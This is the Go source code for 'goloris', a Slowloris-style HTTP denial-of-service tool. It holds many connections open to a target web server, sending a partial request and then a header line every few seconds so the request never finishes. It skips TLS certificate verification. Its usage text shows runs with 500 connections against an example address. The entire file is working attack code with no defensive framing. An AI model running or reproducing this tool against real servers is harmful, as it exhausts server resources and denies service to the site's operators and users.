package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"time"
)

const (
	defaultUserAgent = "Goloris HTTP DoS"
	defaultDOSHeader = "Cookie: a=b"
)

var (
	numConnections int
	interval       int
	timeout        int
	method         string
	resource       string
	userAgent      string
	target         string
	https          bool
	dosHeader      string
	path           string
)

func main() {
	parseParams()
	if len(flag.Args()) == 0 {
		usage()
		os.Exit(-1)
	}

	signals := make(chan os.Signal, 1)
	signal.Notify(signals, os.Interrupt, os.Kill)

	target = flag.Args()[0]
	if !strings.Contains(target, ":") {
		if https {
			target += ":443"
		} else {
			target += ":80"
		}
	}

	openConnections(target, numConnections, timeout, https)

loop:
	for {
		select {
		case <-signals:
			fmt.Printf("Received SIGKILL, exiting...\n")
			break loop
		}
	}
}

func parseParams() {
	flag.IntVar(&numConnections, "connections", 10, "Number of active concurrent connections")
	flag.IntVar(&interval, "interval", 1, "Number of seconds to wait between sending headers")
	flag.IntVar(&timeout, "timeout", 60, "HTTP connection timeout in seconds")
	flag.StringVar(&method, "method", "GET", "HTTP method to use")
	flag.StringVar(&resource, "resource", "/", "Resource to request from the server")
	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
	flag.StringVar(&dosHeader, "dosHeader", defaultDOSHeader, "Header to send repeatedly")
	flag.BoolVar(&https, "https", false, "Use HTTPS")
	flag.Parse()
}

func usage() {
	fmt.Println("")
	fmt.Println("usage: goloris [OPTIONS]... TARGET")
	fmt.Println("  TARGET host:port. port 80 is assumed for HTTP connections. 443 is assumed for HTTPS connections")
	fmt.Println("")
	fmt.Println("OPTIONS")
	flag.PrintDefaults()
	fmt.Println("")
	fmt.Println("EXAMPLES")
	fmt.Printf("  %s -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Printf("  %s -https -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Printf("  %s -useragent=\"some user-agent string\" -https -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Println("")
}

func openConnections(target string, num, timeout int, https bool) {
	for i := 0; i < num; i++ {
		go slowloris(target, interval, timeout, https)
	}
}

func slowloris(target string, interval, timeout int, https bool) {
	timeoutDuration := time.Duration(timeout) * time.Second

loop:
	for {
		var conn net.Conn
		var err error

		if https {
			config := &tls.Config{InsecureSkipVerify: true}
			conn, err = tls.Dial("tcp", target, config)
			if err != nil {
				continue
			}
			defer conn.Close()
		} else {
			conn, err = net.DialTimeout("tcp", target, timeoutDuration)
			if err != nil {
				continue
			}
			defer conn.Close()
		}

		if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", method, resource); err != nil {
			continue
		}

		header := createHeader(target)
		if err = header.Write(conn); err != nil {
			continue
		}

		for {
			select {
			case <-time.After(time.Duration(interval) * time.Second):
				if _, err := fmt.Fprintf(conn, "%s\r\n", dosHeader); err != nil {
					continue loop
				}
			}
		}
	}

}

func createHeader(host string) *http.Header {
	hdr := http.Header{}

	headers := makeHeaderSlice(host)
	for header, value := range headers {
		hdr.Add(header, value)
	}

	return &hdr
}

func makeHeaderSlice(host string) map[string]string {
	headers := make(map[string]string)

	headers["Host"] = host
	headers["User-Agent"] = defaultUserAgent
	headers["Content-Length"] = "42"

	return headers
}
